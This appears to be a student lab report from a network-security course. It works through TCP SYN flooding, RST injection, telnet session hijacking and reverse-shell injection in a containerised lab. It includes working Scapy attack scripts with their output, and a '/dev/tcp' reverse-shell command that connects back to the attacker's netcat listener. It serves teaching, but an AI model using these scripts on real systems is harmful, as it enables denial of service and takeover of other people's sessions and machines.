# TASKS
## TASK 1.1
For task 1 we completed the code where necessary to specifically target the telnet service on port `23`.

```py
#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')     # <-- Targeted port 23 (telnet)
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
    pkt[TCP].sport = getrandbits(16)                 # source port
    pkt[TCP].seq = getrandbits(32)                   # sequence number
    send(pkt, verbose = 0)
```

A first check on the victim machine revealed that the size of the queue was pretty big: `net.ipv4.tcp_max_syn_backlog = 256` and that the cookies were disabled `net.ipv4.tcp_syncookies = 0`.

```
seed@VM:~/.../volumes$ docker exec -it victim-10.9.0.5 netstat -tna | grep SYN_RECV | wc -l
128
```

After a minute or so, we tried to view the status of the queue, however we noticed that even if the max size of the queue was set to 1024, the command show that only around 128/130 SYN_RECV requests were present inside it.

We were able to connect via Telnet with only one instance running of `synflood_draft.py`, but not with at least three instances.

Also the kernel mitigation mechanism proven to be effective to allow already know connections to successfully complete.
We were able to prevent any known connection to happen only by flushing (`ip tcp_metrics flush`) the reserved queue space.

We can try reduce the queue size to 80
```bash
docker exec victim-10.9.0.5 \
  sysctl -w net.ipv4.tcp_max_syn_backlog=80
docker exec victim-10.9.0.5 ip tcp_metrics flush
```

Reducing the backlog to 80 was enough to saturate all the available spots.
Now, during the attack execution, we can see that the number of incomplete connections now is `61` and the Telnet connections now fails (stays on `Trying 10.9.0.5...`).

# TASK 1.2

As written, the proposed C file proven to be way faster than the python one, fullfilling the victim queue in far less time.

Also, regarding the reserved "proven destination" queue space, we were not always able to connect through telnet even if the ip address of the source was in that queue, proving the higher efficiency of C code in this case.

# TASK 1.3

Enabling the SYN cookie mechanism allowed us to connect smoothly without issues through telnet even if the source IP address is not among the ones in the "proven destinations" queue and the attack is launch using python or C.

# TASK 2

## Manual

For this attack we used Wireshark to gather the requested information.

We first authenticated ourselves on telnet and then we look at the last packet sent in the direction we want to RESET the connection (in this case from 10.9.0.6 to 10.9.0.5).

We take the value shown in `sequence number (raw)` and set it as the sequence number in our script, together with the `R` flag.

The final program to manually spoof would look like this:

```py
#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")

# Need to take the seq number (raw) corresponding to the one inside the last packet sent in that direction (in this case from 10.9.0.6 to 10.9.0.5)

tcp = TCP(sport=32804, dport=23, flags="R", seq=2481792999)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
```

Results:
![Results](./volumes/images/Screenshot%20From%202026-10-10%2018-46-16.png)

## Automatic

# TASK 3

## Manual

To Hijack an existing connection we first sniff with wireshark needed information (ports, flags, seq and ack numbers).

First, we want to get the **Sequence Number**: we look for the last packet sent from the client (10.9.0.6) to the server (10.9.0.5) with flags `PSH/ACK` and get both the SEQ number and the size of the payload. 

Then we need to find the **Acknowledgment Number**: we look for the last packet in that same direction, but with flag `ACK`, and we get the ACK number.

```py
#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")

# SEQ: seq number (raw) in the the last PSH/ACK packet sent in that direction (in this case from 10.9.0.6 to 10.9.0.5) + size of data/payload in that packet.

# ACK: ack number (raw) in the last ACK packet sent in that direction.

tcp = TCP(sport=SRCPORT, dport=23, flags="PA", seq=SEQNUM, ack=ACKNUM)
data = "echo hacked > /home/seed/hacked.txt\r\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
```

With the provided code and the information we retrieved, we tried to hijack the active telnet session from the `seed-attacker` container.

```bash
root@seed-attacker:/volumes# python3 hijack_manual_attack.py
version    : BitField  (4 bits)                  = 4               (4)
ihl        : BitField  (4 bits)                  = None            (None)
tos        : XByteField                          = 0               (0)
len        : ShortField                          = None            (None)
id         : ShortField                          = 1               (1)
flags      : FlagsField  (3 bits)                = <Flag 0 ()>     (<Flag 0 ()>)
frag       : BitField  (13 bits)                 = 0               (0)
ttl        : ByteField                           = 64              (64)
proto      : ByteEnumField                       = 6               (0)
chksum     : XShortField                         = None            (None)
src        : SourceIPField                       = '10.9.0.6'      (None)
dst        : DestIPField                         = '10.9.0.5'      (None)
options    : PacketListField                     = []              ([])
--
sport      : ShortEnumField                      = 47640           (20)
dport      : ShortEnumField                      = 23              (80)
seq        : IntField                            = 148153676       (0)
ack        : IntField                            = 525521666       (0)
dataofs    : BitField  (4 bits)                  = None            (None)
reserved   : BitField  (3 bits)                  = 0               (0)
flags      : FlagsField  (9 bits)                = <Flag 24 (PA)>  (<Flag 2 (S)>)
window     : ShortField                          = 8192            (8192)
chksum     : XShortField                         = None            (None)
urgptr     : ShortField                          = 0               (0)
options    : TCPOptionsField                     = []              (b'')
--
load       : StrField                            = b'echo hacked > /home/seed/hacked.txt\r\n' (b'')
```

We succeded and as a result we were able to execute malicious commands on the target machine.
Also the client lost the synchronization of the SEQ and ACK numbers with the server and therefore the connection was dropped.

# Automatic

# TASK 4

For the last task we want to refer to some of the steps we used in task 3.

So we star by forging an hijacking attack but with a payload that enable us to execute a reverse shell from the server (10.9.0.5) and our attacking machine (10.9.0.1).

We gather Sequence number, payload size and Acknowledgment number and forge the packet.

```py
#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")

tcp = TCP(sport=50144, dport=23, flags="PA", seq=1283769608, ack=3194969444)
# Command to open a reverse shell on port 9090 of host 10.9.1.0
data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
```

We open a tcp connection on our machine through the use of netcat: `netcat -lnv 9090`.

We then send the forged packet and see if the shell connects to our machine, remembering to add carriage return (`\r`) and newline (`\r`) to be sure that the command is executed on the server: `data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"`

We did everything correctly and the reverse shell connected succesfully.
